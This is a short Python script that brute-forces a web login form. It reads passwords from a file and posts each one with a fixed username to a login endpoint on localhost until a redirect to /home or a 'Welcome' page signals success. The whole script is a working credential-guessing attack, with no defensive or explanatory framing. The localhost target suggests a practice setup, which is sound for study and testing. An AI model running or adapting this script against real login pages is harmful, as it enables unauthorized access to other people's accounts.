import requests
from requests.adapters import HTTPAdapter

def send_requests(username, password):
    url = 'http://localhost:5000/'  # Assuming the login endpoint is '/'
    data = {'username': username, 'password': password}  # Data for login POST request
    success = False  # Flag to track successful login

    with requests.Session() as session:
        adapter = HTTPAdapter(max_retries=3)  # Adjust the number of retries as needed
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        response = session.post(url, data=data, allow_redirects=False)  # Disable automatic redirection
        
        if response.status_code == 302:  # Check if redirection occurred
            if '/home' in response.headers.get('Location', ''):  # Check if redirected to '/home'
                print(f'Login successful for username: {username}, password: {password}')
                success = True  # Set flag to True
            else:
                print(f'Redirection to unknown location after login for username: {username}, password: {password}')
        elif response.status_code == 200:
            if 'Welcome' in response.text:
                print(f'Login successful for username: {username}, password: {password}')
                success = True  # Set flag to True
            else:
                print(f'Login failed for username: {username}, password: {password}')
        else:
            print(f'Request failed for username: {username}, password: {password}. Status code: {response.status_code}')

    return success

def read_passwords_from_file(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

def main():
    username = 'atharva211'
    password_file = 'generated_passwords.txt'  # Path to your password file
    passwords = read_passwords_from_file(password_file)

    for password in passwords:
        if send_requests(username, password):  # Check if login was successful
            break  # Break out of loop if successful login occurred

if __name__ == '__main__':
    main()
